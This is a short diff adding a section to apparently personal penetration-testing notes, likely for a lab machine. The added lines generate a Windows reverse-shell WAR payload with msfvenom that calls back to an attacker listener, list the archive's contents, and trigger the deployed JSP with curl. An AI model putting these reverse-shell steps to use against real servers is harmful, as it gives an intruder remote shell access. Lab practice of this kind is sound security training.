@@ -2,3 +2,12 @@ nmap --min-rate 5000 >> NOTE
 
 
 hosts on windows : /windows/system32/drivers/etc/hosts
+
+
+=============================.war=====
+> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war
+
+> jar -ft rev_shell-9002.war
+
+> curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp
+======================================
